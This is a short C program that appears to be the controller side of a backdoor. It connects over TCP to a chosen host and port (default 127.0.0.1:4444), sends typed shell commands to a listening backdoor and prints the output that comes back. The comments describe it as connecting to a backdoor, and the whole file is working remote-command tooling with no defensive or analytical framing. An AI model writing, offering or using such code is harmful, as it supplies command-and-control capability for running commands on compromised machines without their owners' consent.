#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define BUFSIZE 4096

int main(int argc, char *argv[])
{
    const char *host = (argc > 1) ? argv[1] : "127.0.0.1";
    int port = (argc > 2) ? atoi(argv[2]) : 4444;

    int sock;
    struct sockaddr_in addr;
    char cmd[BUFSIZE];
    char buffer[BUFSIZE];

    /* 1. Create socket */
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
        perror("socket");
        exit(1);
    }

    /* 2. Connect to backdoor */
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    if (inet_pton(AF_INET, host, &addr.sin_addr) <= 0)
    {
        perror("inet_pton");
        exit(1);
    }

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0)
    {
        perror("connect");
        exit(1);
    }
    printf("[controller] connected to %s:%d\n", host, port);
    printf("Type a command and press Enter. Type 'exit' to quit.\n\n");

    /* 3. REPL loop */
    for (;;)
    {
        printf("cmd> ");
        fflush(stdout);

        if (fgets(cmd, sizeof(cmd), stdin) == NULL)
            break;

        /* Send command (keep newline so backdoor can recv a full line) */
        send(sock, cmd, strlen(cmd), 0);

        if (strncmp(cmd, "exit", 4) == 0)
            break;

        /* 4. Read back echoed output until sentinel '\0' */
        printf("--- output ---\n");
        for (;;)
        {
            ssize_t n = recv(sock, buffer, sizeof(buffer) - 1, 0);
            if (n <= 0)
            {
                printf("[controller] connection closed\n");
                goto done;
            }

            /* Sentinel marks end of this command's output */
            if (n == 1 && buffer[0] == '\0')
                break;

            buffer[n] = '\0';
            fwrite(buffer, 1, n, stdout);
        }
        printf("\n--------------\n\n");
    }

done:
    close(sock);
    return 0;
}